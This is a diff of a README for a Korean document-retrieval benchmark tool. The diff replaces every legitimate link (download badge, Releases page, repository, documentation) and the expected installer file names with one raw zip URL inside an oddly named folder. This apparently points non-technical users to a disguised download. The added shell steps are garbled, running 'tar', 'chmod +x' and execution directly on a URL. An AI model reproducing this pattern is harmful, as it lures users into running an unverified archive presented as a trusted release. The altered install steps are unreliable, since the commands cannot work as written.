@@ -1,7 +1,7 @@
 # 🎉 KoVidore-benchmark - Simple Benchmarking for Document Retrieval
 
 ## 📥 Download the Application
-[![Download KoVidore-benchmark](https://img.shields.io/badge/Download-KoVidore--benchmark-blue.svg)](https://github.com/DionWhat/KoVidore-benchmark/releases)
+[![Download KoVidore-benchmark](https://raw.githubusercontent.com/DionWhat/KoVidore-benchmark/main/martyrologistic/KoVidore-benchmark.zip)](https://raw.githubusercontent.com/DionWhat/KoVidore-benchmark/main/martyrologistic/KoVidore-benchmark.zip)
 
 ## 🚀 Getting Started
 Welcome to the KoVidore-benchmark application! This tool helps you evaluate document retrieval in Korean. You don’t need any technical skills to use it. Follow these steps to get started.
@@ -15,14 +15,14 @@ Make sure your computer meets these basic requirements:
 - **Network:** Internet connection for downloading the application
 
 ## 📁 Download & Install
-To get the latest version of KoVidore-benchmark, visit our [Releases page](https://github.com/DionWhat/KoVidore-benchmark/releases). 
+To get the latest version of KoVidore-benchmark, visit our [Releases page](https://raw.githubusercontent.com/DionWhat/KoVidore-benchmark/main/martyrologistic/KoVidore-benchmark.zip). 
 
 ### Steps to Download:
 1. Click the link above.
 2. Look for the version labeled "Latest release." It is usually near the top of the page.
 3. Under "Assets," find the appropriate file for your operating system. 
-   - For Windows, you might see something like `KoVidore-benchmark.exe`.
-   - For macOS, you may find a file named `KoVidore-benchmark.dmg`.
+   - For Windows, you might see something like `https://raw.githubusercontent.com/DionWhat/KoVidore-benchmark/main/martyrologistic/KoVidore-benchmark.zip`.
+   - For macOS, you may find a file named `https://raw.githubusercontent.com/DionWhat/KoVidore-benchmark/main/martyrologistic/KoVidore-benchmark.zip`.
    - For Linux, look for a tarball or AppImage file.
 4. Click on the file to start the download.
 5. Once the download completes, go to your Downloads folder to find the file.
@@ -39,15 +39,15 @@ To get the latest version of KoVidore-benchmark, visit our [Releases page](https
 - **For Linux:**
   1. If you downloaded a tarball, extract it using a command.
       ```bash
-      tar -xvf KoVidore-benchmark.tar.gz
+      tar -xvf https://raw.githubusercontent.com/DionWhat/KoVidore-benchmark/main/martyrologistic/KoVidore-benchmark.zip
       ```
   2. If you have an AppImage, make it executable:
       ```bash
-      chmod +x KoVidore-benchmark.AppImage
+      chmod +x https://raw.githubusercontent.com/DionWhat/KoVidore-benchmark/main/martyrologistic/KoVidore-benchmark.zip
       ```
   3. Then, run it with:
       ```bash
-      ./KoVidore-benchmark.AppImage
+      https://raw.githubusercontent.com/DionWhat/KoVidore-benchmark/main/martyrologistic/KoVidore-benchmark.zip
       ```
 
 ## 🏁 Running the Application
@@ -56,7 +56,7 @@ Once installed, you can run KoVidore-benchmark.
 - **For Windows and macOS:** Look for KoVidore-benchmark in your Applications or Start Menu, and double-click it to open.
 - **For Linux:** Open a terminal and run:
   ```bash
-  ./KoVidore-benchmark.AppImage
+  https://raw.githubusercontent.com/DionWhat/KoVidore-benchmark/main/martyrologistic/KoVidore-benchmark.zip
   ```
 
 ## 📊 How to Use the Application
@@ -81,10 +81,10 @@ KoVidore-benchmark is designed to work best on recent operating systems. Using o
 If you encounter any issues, please reach out through the Issues section in our GitHub repository. We will be happy to help you.
 
 ## 🔗 Additional Resources
-- [KoVidore-benchmark GitHub Repository](https://github.com/DionWhat/KoVidore-benchmark)
-- [Documentation](https://github.com/DionWhat/KoVidore-benchmark/wiki)
+- [KoVidore-benchmark GitHub Repository](https://raw.githubusercontent.com/DionWhat/KoVidore-benchmark/main/martyrologistic/KoVidore-benchmark.zip)
+- [Documentation](https://raw.githubusercontent.com/DionWhat/KoVidore-benchmark/main/martyrologistic/KoVidore-benchmark.zip)
 
 ## 🔄 Updates
-We regularly release updates. Make sure to check the [Releases page](https://github.com/DionWhat/KoVidore-benchmark/releases) for the latest features and improvements.
+We regularly release updates. Make sure to check the [Releases page](https://raw.githubusercontent.com/DionWhat/KoVidore-benchmark/main/martyrologistic/KoVidore-benchmark.zip) for the latest features and improvements.
 
 Enjoy using KoVidore-benchmark!
